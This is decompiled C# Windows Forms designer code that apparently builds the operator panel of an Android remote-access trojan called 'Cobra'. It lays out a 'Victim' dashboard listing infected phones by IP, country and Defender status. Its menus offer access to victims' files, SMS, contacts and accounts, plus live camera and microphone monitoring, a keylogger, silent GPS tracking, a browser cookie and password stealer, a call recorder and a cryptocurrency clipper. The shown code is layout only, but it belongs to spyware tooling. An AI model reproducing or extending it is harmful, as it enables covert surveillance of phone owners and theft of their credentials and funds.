		this.recvtotal.Text = "0 KB";
		this.recvtotal.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.DrakeUIAvatar6.BackColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar6.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar6.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIAvatar6.FillColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar6.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar6.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar6.Location = new System.Drawing.Point(175, 29);
		this.DrakeUIAvatar6.Name = "DrakeUIAvatar6";
		this.DrakeUIAvatar6.Size = new System.Drawing.Size(55, 93);
		this.DrakeUIAvatar6.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar6.StyleCustomMode = true;
		this.DrakeUIAvatar6.Symbol = 61677;
		this.DrakeUIAvatar6.SymbolSize = 64;
		this.DrakeUIAvatar6.TabIndex = 12;
		this.DrakeUIAvatar6.Text = "DrakeUIAvatar6";
		this.SentBox.Controls.Add(this.senttotal);
		this.SentBox.Controls.Add(this.DrakeUIAvatar7);
		this.SentBox.FillColor = System.Drawing.Color.Black;
		this.SentBox.Font = new System.Drawing.Font("Calibri", 25f);
		this.SentBox.ForeColor = System.Drawing.Color.SkyBlue;
		this.SentBox.Location = new System.Drawing.Point(288, 15);
		this.SentBox.Margin = new System.Windows.Forms.Padding(4);
		this.SentBox.Name = "SentBox";
		this.SentBox.Padding = new System.Windows.Forms.Padding(0, 29, 0, 0);
		this.SentBox.RectColor = System.Drawing.Color.SkyBlue;
		this.SentBox.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.SentBox.Size = new System.Drawing.Size(229, 122);
		this.SentBox.Style = DrakeUI.Framework.UIStyle.Custom;
		this.SentBox.StyleCustomMode = true;
		this.SentBox.TabIndex = 2;
		this.SentBox.Text = "Cobra Sent";
		this.senttotal.BackColor = System.Drawing.Color.Transparent;
		this.senttotal.Dock = System.Windows.Forms.DockStyle.Fill;
		this.senttotal.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold);
		this.senttotal.ForeColor = System.Drawing.Color.SkyBlue;
		this.senttotal.Location = new System.Drawing.Point(0, 29);
		this.senttotal.Name = "senttotal";
		this.senttotal.Size = new System.Drawing.Size(166, 93);
		this.senttotal.Style = DrakeUI.Framework.UIStyle.Custom;
		this.senttotal.StyleCustomMode = true;
		this.senttotal.TabIndex = 11;
		this.senttotal.Text = "0 KB";
		this.senttotal.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.DrakeUIAvatar7.BackColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar7.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar7.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIAvatar7.FillColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar7.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar7.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar7.Location = new System.Drawing.Point(166, 29);
		this.DrakeUIAvatar7.Name = "DrakeUIAvatar7";
		this.DrakeUIAvatar7.Size = new System.Drawing.Size(63, 93);
		this.DrakeUIAvatar7.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar7.StyleCustomMode = true;
		this.DrakeUIAvatar7.Symbol = 61678;
		this.DrakeUIAvatar7.SymbolSize = 64;
		this.DrakeUIAvatar7.TabIndex = 13;
		this.DrakeUIAvatar7.Text = "DrakeUIAvatar7";
		this.RecentBox.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
		this.RecentBox.Controls.Add(this.lastclienttext);
		this.RecentBox.Controls.Add(this.lastclientpic);
		this.RecentBox.FillColor = System.Drawing.Color.Black;
		this.RecentBox.Font = new System.Drawing.Font("Calibri", 25f);
		this.RecentBox.ForeColor = System.Drawing.Color.SkyBlue;
		this.RecentBox.Location = new System.Drawing.Point(803, 15);
		this.RecentBox.Margin = new System.Windows.Forms.Padding(4);
		this.RecentBox.Name = "RecentBox";
		this.RecentBox.Padding = new System.Windows.Forms.Padding(0, 29, 0, 0);
		this.RecentBox.RectColor = System.Drawing.Color.SkyBlue;
		this.RecentBox.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.RecentBox.Size = new System.Drawing.Size(251, 122);
		this.RecentBox.Style = DrakeUI.Framework.UIStyle.Custom;
		this.RecentBox.StyleCustomMode = true;
		this.RecentBox.TabIndex = 3;
		this.RecentBox.Text = "Cobra Recent";
		this.lastclienttext.BackColor = System.Drawing.Color.Transparent;
		this.lastclienttext.Dock = System.Windows.Forms.DockStyle.Fill;
		this.lastclienttext.Font = new System.Drawing.Font("Calibri", 15f, System.Drawing.FontStyle.Bold);
		this.lastclienttext.ForeColor = System.Drawing.Color.SkyBlue;
		this.lastclienttext.Location = new System.Drawing.Point(0, 29);
		this.lastclienttext.Name = "lastclienttext";
		this.lastclienttext.Size = new System.Drawing.Size(194, 93);
		this.lastclienttext.Style = DrakeUI.Framework.UIStyle.Custom;
		this.lastclienttext.StyleCustomMode = true;
		this.lastclienttext.TabIndex = 11;
		this.lastclienttext.Text = "....\r\n....\r\n....";
		this.lastclienttext.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.lastclientpic.BackColor = System.Drawing.Color.Transparent;
		this.lastclientpic.Cursor = System.Windows.Forms.Cursors.Hand;
		this.lastclientpic.Dock = System.Windows.Forms.DockStyle.Right;
		this.lastclientpic.FillColor = System.Drawing.Color.Transparent;
		this.lastclientpic.Font = new System.Drawing.Font("Calibri", 12f);
		this.lastclientpic.ForeColor = System.Drawing.Color.SkyBlue;
		this.lastclientpic.Location = new System.Drawing.Point(194, 29);
		this.lastclientpic.Name = "lastclientpic";
		this.lastclientpic.Size = new System.Drawing.Size(57, 93);
		this.lastclientpic.Style = DrakeUI.Framework.UIStyle.Custom;
		this.lastclientpic.StyleCustomMode = true;
		this.lastclientpic.Symbol = 62004;
		this.lastclientpic.SymbolSize = 55;
		this.lastclientpic.TabIndex = 12;
		this.lastclientpic.Text = "DrakeUIAvatar8";
		this.notifiform.SetToolTip(this.lastclientpic, "Logs");
		this.DashboardPanel.Controls.Add(this.ClientsWindow);
		this.DashboardPanel.Controls.Add(this.MonitorPanel);
		this.DashboardPanel.Controls.Add(this.Panel6);
		this.DashboardPanel.Controls.Add(this.Panel19);
		this.DashboardPanel.Controls.Add(this.Panel7);
		this.DashboardPanel.Controls.Add(this.Panel4);
		this.DashboardPanel.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DashboardPanel.FillColor = System.Drawing.Color.Black;
		this.DashboardPanel.Font = new System.Drawing.Font("Calibri", 12f);
		this.DashboardPanel.ForeColor = System.Drawing.Color.SkyBlue;
		this.DashboardPanel.Location = new System.Drawing.Point(124, 34);
		this.DashboardPanel.Margin = new System.Windows.Forms.Padding(4);
		this.DashboardPanel.Name = "DashboardPanel";
		this.DashboardPanel.RectColor = System.Drawing.Color.Black;
		this.DashboardPanel.RectDisableColor = System.Drawing.Color.SkyBlue;
		this.DashboardPanel.Size = new System.Drawing.Size(1065, 569);
		this.DashboardPanel.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DashboardPanel.StyleCustomMode = true;
		this.DashboardPanel.TabIndex = 0;
		this.DashboardPanel.Text = "Victim";
		this.DashboardPanel.TextAlignment = System.Drawing.ContentAlignment.MiddleRight;
		this.DashboardPanel.TitleColor = System.Drawing.Color.Black;
		this.DashboardPanel.TitleHeight = 0;
		this.ClientsWindow.AllowUserToAddRows = false;
		this.ClientsWindow.AllowUserToDeleteRows = false;
		this.ClientsWindow.AllowUserToResizeColumns = false;
		this.ClientsWindow.AllowUserToResizeRows = false;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle.Font = new System.Drawing.Font("Calibri", 9f);
		dataGridViewCellStyle.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle.SelectionBackColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle.SelectionForeColor = System.Drawing.Color.SkyBlue;
		this.ClientsWindow.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		this.ClientsWindow.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.ClientsWindow.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.ClientsWindow.BackgroundColor = System.Drawing.Color.Black;
		this.ClientsWindow.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
		this.ClientsWindow.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.ClientsWindow.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		this.ClientsWindow.ColumnHeadersHeight = 32;
		this.ClientsWindow.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
		this.ClientsWindow.ColumnHeadersVisible = false;
		this.ClientsWindow.Columns.AddRange(this.cliscren, this.cliav, this.cliflg, this.cliname, this.clicountry, this.cliip, this.andver, this.phondmod, this.clinoti, this.clicalls, this.clibtry, this.cliwifi, this.cliavt, this.defcli, this.isadmincli, this.clipng, this.instdate);
		this.ClientsWindow.ContextMenuStrip = this.ctxmenu;
		this.ClientsWindow.Cursor = System.Windows.Forms.Cursors.Hand;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle3.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.ClientsWindow.DefaultCellStyle = dataGridViewCellStyle3;
		this.ClientsWindow.Dock = System.Windows.Forms.DockStyle.Fill;
		this.ClientsWindow.EnableHeadersVisualStyles = false;
		this.ClientsWindow.Font = new System.Drawing.Font("Calibri", 12f);
		this.ClientsWindow.GridColor = System.Drawing.Color.SkyBlue;
		this.ClientsWindow.Location = new System.Drawing.Point(8, 29);
		this.ClientsWindow.Margin = new System.Windows.Forms.Padding(2);
		this.ClientsWindow.Name = "ClientsWindow";
		this.ClientsWindow.ReadOnly = true;
		this.ClientsWindow.RectColor = System.Drawing.Color.SkyBlue;
		this.ClientsWindow.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle4.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle4.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle4.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.ClientsWindow.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
		this.ClientsWindow.RowHeadersVisible = false;
		dataGridViewCellStyle5.BackColor = System.Drawing.Color.Black;
		dataGridViewCellStyle5.Font = new System.Drawing.Font("Calibri", 9f);
		dataGridViewCellStyle5.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.SkyBlue;
		this.ClientsWindow.RowsDefaultCellStyle = dataGridViewCellStyle5;
		this.ClientsWindow.RowTemplate.Height = 29;
		this.ClientsWindow.SelectedIndex = -1;
		this.ClientsWindow.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.ClientsWindow.ShowEditingIcon = false;
		this.ClientsWindow.Size = new System.Drawing.Size(746, 515);
		this.ClientsWindow.StripeEvenColor = System.Drawing.Color.Black;
		this.ClientsWindow.StripeOddColor = System.Drawing.Color.Black;
		this.ClientsWindow.Style = DrakeUI.Framework.UIStyle.Custom;
		this.ClientsWindow.StyleCustomMode = true;
		this.ClientsWindow.TabIndex = 35;
		this.cliscren.FillWeight = 25f;
		this.cliscren.HeaderText = "Screen";
		this.cliscren.Name = "cliscren";
		this.cliscren.ReadOnly = true;
		this.cliav.FillWeight = 45f;
		this.cliav.HeaderText = "avatar";
		this.cliav.Name = "cliav";
		this.cliav.ReadOnly = true;
		this.cliflg.FillWeight = 20f;
		this.cliflg.HeaderText = "Flag";
		this.cliflg.Name = "cliflg";
		this.cliflg.ReadOnly = true;
		this.cliname.FillWeight = 90f;
		this.cliname.HeaderText = "Name";
		this.cliname.Name = "cliname";
		this.cliname.ReadOnly = true;
		this.clicountry.FillWeight = 50f;
		this.clicountry.HeaderText = "Country";
		this.clicountry.Name = "clicountry";
		this.clicountry.ReadOnly = true;
		this.cliip.FillWeight = 70f;
		this.cliip.HeaderText = "Address";
		this.cliip.Name = "cliip";
		this.cliip.ReadOnly = true;
		this.andver.FillWeight = 50f;
		this.andver.HeaderText = "Android";
		this.andver.Name = "andver";
		this.andver.ReadOnly = true;
		this.phondmod.FillWeight = 50f;
		this.phondmod.HeaderText = "Phone";
		this.phondmod.Name = "phondmod";
		this.phondmod.ReadOnly = true;
		this.clinoti.FillWeight = 15f;
		this.clinoti.HeaderText = "Notifi";
		this.clinoti.Name = "clinoti";
		this.clinoti.ReadOnly = true;
		this.clicalls.FillWeight = 15f;
		this.clicalls.HeaderText = "Calls";
		this.clicalls.Name = "clicalls";
		this.clicalls.ReadOnly = true;
		this.clibtry.FillWeight = 35f;
		this.clibtry.HeaderText = "Battery";
		this.clibtry.Name = "clibtry";
		this.clibtry.ReadOnly = true;
		this.cliwifi.FillWeight = 35f;
		this.cliwifi.HeaderText = "Wifi";
		this.cliwifi.Name = "cliwifi";
		this.cliwifi.ReadOnly = true;
		this.cliavt.FillWeight = 60f;
		this.cliavt.HeaderText = "Active";
		this.cliavt.Name = "cliavt";
		this.cliavt.ReadOnly = true;
		this.defcli.FillWeight = 40f;
		this.defcli.HeaderText = "Defender";
		this.defcli.Name = "defcli";
		this.defcli.ReadOnly = true;
		this.isadmincli.FillWeight = 25f;
		this.isadmincli.HeaderText = "isAdmin";
		this.isadmincli.Name = "isadmincli";
		this.isadmincli.ReadOnly = true;
		this.clipng.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.DisplayedCells;
		this.clipng.FillWeight = 15f;
		this.clipng.HeaderText = "Ping";
		this.clipng.Name = "clipng";
		this.clipng.ReadOnly = true;
		this.clipng.Width = 5;
		this.instdate.FillWeight = 45f;
		this.instdate.HeaderText = "installed";
		this.instdate.Name = "instdate";
		this.instdate.ReadOnly = true;
		this.ctxmenu.BackColor = System.Drawing.Color.Black;
		this.ctxmenu.Font = new System.Drawing.Font("Calibri", 12f);
		this.ctxmenu.ImageScalingSize = new System.Drawing.Size(20, 20);
		this.ctxmenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[15]
		{
			this.ManagersToolStripMenuItem, this.ToolStripSeparator1, this.MonitorsToolStripMenuItem, this.ToolStripSeparator3, this.AdminToolStripMenuItem, this.ToolStripSeparator6, this.ToolStripMenuItem4, this.ToolStripSeparator5, this.ExtraToolStripMenuItem, this.ToolStripSeparator7,
			this.ToolStripMenuItem13, this.ToolStripSeparator8, this.KeyboardToolStripMenuItem, this.ToolStripSeparator4, this.ClientFolderToolStripMenuItem
		});
		this.ctxmenu.Name = "DrakeUIContextMenuStrip1";
		this.ctxmenu.ShowImageMargin = false;
		this.ctxmenu.Size = new System.Drawing.Size(157, 238);
		this.ManagersToolStripMenuItem.BackColor = System.Drawing.Color.Black;
		this.ManagersToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[7] { this.FilesToolStripMenuItem, this.SMSToolStripMenuItem, this.CallsToolStripMenuItem1, this.ContactsToolStripMenuItem, this.AccountsToolStripMenuItem, this.ApplicationsToolStripMenuItem, this.ToolStripMenuItem12 });
		this.ManagersToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.ManagersToolStripMenuItem.Name = "ManagersToolStripMenuItem";
		this.ManagersToolStripMenuItem.Size = new System.Drawing.Size(156, 24);
		this.ManagersToolStripMenuItem.Text = "Victim Managers";
		this.FilesToolStripMenuItem.BackColor = System.Drawing.Color.Black;
		this.FilesToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.FilesToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("FilesToolStripMenuItem.Image");
		this.FilesToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.FilesToolStripMenuItem.Name = "FilesToolStripMenuItem";
		this.FilesToolStripMenuItem.Size = new System.Drawing.Size(177, 42);
		this.FilesToolStripMenuItem.Text = "Victim Files";
		this.FilesToolStripMenuItem.TextImageRelation = System.Windows.Forms.TextImageRelation.ImageAboveText;
		this.SMSToolStripMenuItem.BackColor = System.Drawing.Color.Black;
		this.SMSToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.SMSToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("SMSToolStripMenuItem.Image");
		this.SMSToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.SMSToolStripMenuItem.Name = "SMSToolStripMenuItem";
		this.SMSToolStripMenuItem.Size = new System.Drawing.Size(177, 42);
		this.SMSToolStripMenuItem.Text = "Victim SMS";
		this.CallsToolStripMenuItem1.BackColor = System.Drawing.Color.Black;
		this.CallsToolStripMenuItem1.ForeColor = System.Drawing.Color.SkyBlue;
		this.CallsToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("CallsToolStripMenuItem1.Image");
		this.CallsToolStripMenuItem1.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.CallsToolStripMenuItem1.Name = "CallsToolStripMenuItem1";
		this.CallsToolStripMenuItem1.Size = new System.Drawing.Size(177, 42);
		this.CallsToolStripMenuItem1.Text = "Victim Calls";
		this.ContactsToolStripMenuItem.BackColor = System.Drawing.Color.Black;
		this.ContactsToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.ContactsToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("ContactsToolStripMenuItem.Image");
		this.ContactsToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ContactsToolStripMenuItem.Name = "ContactsToolStripMenuItem";
		this.ContactsToolStripMenuItem.Size = new System.Drawing.Size(177, 42);
		this.ContactsToolStripMenuItem.Text = "Victim Contacts";
		this.AccountsToolStripMenuItem.BackColor = System.Drawing.Color.Black;
		this.AccountsToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.AccountsToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("AccountsToolStripMenuItem.Image");
		this.AccountsToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.AccountsToolStripMenuItem.Name = "AccountsToolStripMenuItem";
		this.AccountsToolStripMenuItem.Size = new System.Drawing.Size(177, 42);
		this.AccountsToolStripMenuItem.Text = "Victim Accounts";
		this.ApplicationsToolStripMenuItem.BackColor = System.Drawing.Color.Black;
		this.ApplicationsToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.ApplicationsToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("ApplicationsToolStripMenuItem.Image");
		this.ApplicationsToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ApplicationsToolStripMenuItem.Name = "ApplicationsToolStripMenuItem";
		this.ApplicationsToolStripMenuItem.Size = new System.Drawing.Size(177, 42);
		this.ApplicationsToolStripMenuItem.Text = "Victim Applications";
		this.ToolStripMenuItem12.BackColor = System.Drawing.Color.Black;
		this.ToolStripMenuItem12.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem12.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem12.Image");
		this.ToolStripMenuItem12.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem12.Name = "ToolStripMenuItem12";
		this.ToolStripMenuItem12.Size = new System.Drawing.Size(177, 42);
		this.ToolStripMenuItem12.Text = "Victim Permissions";
		this.ToolStripSeparator1.BackColor = System.Drawing.Color.Black;
		this.ToolStripSeparator1.ForeColor = System.Drawing.Color.Black;
		this.ToolStripSeparator1.Name = "ToolStripSeparator1";
		this.ToolStripSeparator1.Size = new System.Drawing.Size(153, 6);
		this.MonitorsToolStripMenuItem.BackColor = System.Drawing.Color.Black;
		this.MonitorsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[10] { this.ScreenMonitorToolStripMenuItem, this.ToolStripMenuItem14, this.CameraMonitorToolStripMenuItem, this.MicrophoneMonitorToolStripMenuItem, this.KeyloggerToolStripMenuItem1, this.LocationsMonitorToolStripMenuItem, this.WebBrowserToolStripMenuItem1, this.CallRecorderToolStripMenuItem, this.ToolStripMenuItem3, this.ScreenReaderToolStripMenuItem });
		this.MonitorsToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.MonitorsToolStripMenuItem.Name = "MonitorsToolStripMenuItem";
		this.MonitorsToolStripMenuItem.Size = new System.Drawing.Size(156, 24);
		this.MonitorsToolStripMenuItem.Text = "Victim Monitors";
		this.ScreenMonitorToolStripMenuItem.BackColor = System.Drawing.Color.Black;
		this.ScreenMonitorToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.ScreenMonitorToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("ScreenMonitorToolStripMenuItem.Image");
		this.ScreenMonitorToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ScreenMonitorToolStripMenuItem.Name = "ScreenMonitorToolStripMenuItem";
		this.ScreenMonitorToolStripMenuItem.Size = new System.Drawing.Size(229, 42);
		this.ScreenMonitorToolStripMenuItem.Text = "Screen Monitor v3";
		this.ToolStripMenuItem14.BackColor = System.Drawing.Color.Black;
		this.ToolStripMenuItem14.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem14.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem14.Image");
		this.ToolStripMenuItem14.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem14.Name = "ToolStripMenuItem14";
		this.ToolStripMenuItem14.Size = new System.Drawing.Size(229, 42);
		this.ToolStripMenuItem14.Text = "Screen Reader V3";
		this.CameraMonitorToolStripMenuItem.BackColor = System.Drawing.Color.Black;
		this.CameraMonitorToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.CameraMonitorToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("CameraMonitorToolStripMenuItem.Image");
		this.CameraMonitorToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.CameraMonitorToolStripMenuItem.Name = "CameraMonitorToolStripMenuItem";
		this.CameraMonitorToolStripMenuItem.Size = new System.Drawing.Size(229, 42);
		this.CameraMonitorToolStripMenuItem.Text = "Camera Monitor";
		this.MicrophoneMonitorToolStripMenuItem.BackColor = System.Drawing.Color.Black;
		this.MicrophoneMonitorToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.MicrophoneMonitorToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("MicrophoneMonitorToolStripMenuItem.Image");
		this.MicrophoneMonitorToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.MicrophoneMonitorToolStripMenuItem.Name = "MicrophoneMonitorToolStripMenuItem";
		this.MicrophoneMonitorToolStripMenuItem.Size = new System.Drawing.Size(229, 42);
		this.MicrophoneMonitorToolStripMenuItem.Text = "Microphone Monitor";
		this.KeyloggerToolStripMenuItem1.BackColor = System.Drawing.Color.Black;
		this.KeyloggerToolStripMenuItem1.ForeColor = System.Drawing.Color.SkyBlue;
		this.KeyloggerToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("KeyloggerToolStripMenuItem1.Image");
		this.KeyloggerToolStripMenuItem1.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.KeyloggerToolStripMenuItem1.Name = "KeyloggerToolStripMenuItem1";
		this.KeyloggerToolStripMenuItem1.Size = new System.Drawing.Size(229, 42);
		this.KeyloggerToolStripMenuItem1.Text = "Online/Offiline Keylogger";
		this.LocationsMonitorToolStripMenuItem.BackColor = System.Drawing.Color.Black;
		this.LocationsMonitorToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.LiveModeToolStripMenuItem1, this.ToolStripSeparator2, this.SilentModeGOIPToolStripMenuItem });
		this.LocationsMonitorToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.LocationsMonitorToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("LocationsMonitorToolStripMenuItem.Image");
		this.LocationsMonitorToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.LocationsMonitorToolStripMenuItem.Name = "LocationsMonitorToolStripMenuItem";
		this.LocationsMonitorToolStripMenuItem.Size = new System.Drawing.Size(229, 42);
		this.LocationsMonitorToolStripMenuItem.Text = "Start Locations Monitor";
		this.LiveModeToolStripMenuItem1.BackColor = System.Drawing.Color.Black;
		this.LiveModeToolStripMenuItem1.ForeColor = System.Drawing.Color.SkyBlue;
		this.LiveModeToolStripMenuItem1.Name = "LiveModeToolStripMenuItem1";
		this.LiveModeToolStripMenuItem1.Size = new System.Drawing.Size(202, 24);
		this.LiveModeToolStripMenuItem1.Text = "Live Mode (GPS)";
		this.ToolStripSeparator2.BackColor = System.Drawing.Color.Black;
		this.ToolStripSeparator2.ForeColor = System.Drawing.Color.Black;
		this.ToolStripSeparator2.Name = "ToolStripSeparator2";
		this.ToolStripSeparator2.Size = new System.Drawing.Size(199, 6);
		this.SilentModeGOIPToolStripMenuItem.BackColor = System.Drawing.Color.Black;
		this.SilentModeGOIPToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.SilentModeGOIPToolStripMenuItem.Name = "SilentModeGOIPToolStripMenuItem";
		this.SilentModeGOIPToolStripMenuItem.Size = new System.Drawing.Size(202, 24);
		this.SilentModeGOIPToolStripMenuItem.Text = "Silent Mode (GOIP)";
		this.WebBrowserToolStripMenuItem1.BackColor = System.Drawing.Color.Black;
		this.WebBrowserToolStripMenuItem1.ForeColor = System.Drawing.Color.SkyBlue;
		this.WebBrowserToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("WebBrowserToolStripMenuItem1.Image");
		this.WebBrowserToolStripMenuItem1.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.WebBrowserToolStripMenuItem1.Name = "WebBrowserToolStripMenuItem1";
		this.WebBrowserToolStripMenuItem1.Size = new System.Drawing.Size(229, 42);
		this.WebBrowserToolStripMenuItem1.Text = "Browser Cookies/History/Password Stealer";
		this.CallRecorderToolStripMenuItem.BackColor = System.Drawing.Color.Black;
		this.CallRecorderToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
		this.CallRecorderToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("CallRecorderToolStripMenuItem.Image");
		this.CallRecorderToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.CallRecorderToolStripMenuItem.Name = "CallRecorderToolStripMenuItem";
		this.CallRecorderToolStripMenuItem.Size = new System.Drawing.Size(229, 42);
		this.CallRecorderToolStripMenuItem.Text = "Call Recorder";
		this.ToolStripMenuItem3.BackColor = System.Drawing.Color.Black;
		this.ToolStripMenuItem3.ForeColor = System.Drawing.Color.SkyBlue;
		this.ToolStripMenuItem3.Image = (System.Drawing.Image)resources.GetObject("ToolStripMenuItem3.Image");
		this.ToolStripMenuItem3.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem3.Name = "ToolStripMenuItem3";
		this.ToolStripMenuItem3.Size = new System.Drawing.Size(229, 42);
		this.LocationsMonitorToolStripMenuItem.ImageScaling = System.Windows.Forms.ToolStripItemImageScaling.None;
		this.ToolStripMenuItem3.Text = "USDT TRC-20/BTC/BNB/ETH/LTC Clipper";
		this.ScreenReaderToolStripMenuItem.BackColor = System.Drawing.Color.Black;
		this.ScreenReaderToolStripMenuItem.ForeColor = System.Drawing.Color.SkyBlue;
